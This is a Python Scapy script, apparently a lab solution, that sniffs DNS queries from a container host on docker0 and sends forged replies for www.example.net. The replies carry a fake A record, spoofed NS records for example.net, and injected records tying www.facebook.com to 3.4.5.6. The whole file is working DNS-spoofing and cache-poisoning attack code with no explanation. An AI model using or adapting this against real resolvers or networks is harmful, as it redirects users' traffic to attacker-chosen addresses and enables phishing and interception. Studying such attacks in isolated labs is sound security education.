#!/usr/bin/python
from scapy.all import *
def spoof_dns(pkt):
    if (DNS in pkt and 'www.example.net' in pkt[DNS].qd.qname):
        # Swap the source and destination IP address
        IPpkt = IP(dst = pkt[IP].src, src = pkt[IP].dst)
        # Swap the source and destination port number
        UDPpkt = UDP(dport = pkt[UDP].sport, sport = 53)
        # The Answer Section
        Anssec = DNSRR(rrname = pkt[DNS].qd.qname, type = 'A',
        ttl = 259200, rdata = '1.1.1.1')
        
        
        # The Authority Section
        NSsec1 = DNSRR(rrname = 'example.net', type = 'NS',
        ttl = 259200, rdata = 'ns1.example.net')
        NSsec2 = DNSRR(rrname = 'example.net', type = 'NS',
        ttl = 259200, rdata = 'ns2.example.net')
        NSsec3 = DNSRR(rrname = 'example.net', type = 'NS',
        ttl = 259200, rdata = 'www.facebook.com')

        
        # The Additional Section
        Addsec1 = DNSRR(rrname = 'ns1.example.net', type = 'A',
        ttl = 259200, rdata = '1.2.3.4')
        Addsec2 = DNSRR(rrname = 'ns2.example.net', type = 'A',
        ttl = 259200, rdata = '1.2.3.5')

        Addsec3 = DNSRR(rrname = 'www.facebook.com', type = 'A',
        ttl = 259200, rdata = '3.4.5.6')

        
        # Construct the DNS packet
        DNSpkt = DNS(id = pkt[DNS].id, qd = pkt[DNS].qd, aa = 1, rd = 0, qr = 1,
        qdcount = 1, ancount = 1, nscount = 3, arcount = 3,
        an = Anssec, ns = NSsec1/NSsec2/NSsec3, ar = Addsec1/Addsec2/Addsec3)
        # Construct the entire IP packet and send it out
        
        
        spoofpkt = IPpkt/UDPpkt/DNSpkt
        send(spoofpkt)
# Sniff UDP query packets and invoke spoof_dns().
pkt = sniff(filter = 'udp and dst port 53 and src host 172.17.0.3',
prn = spoof_dns, iface = "docker0")
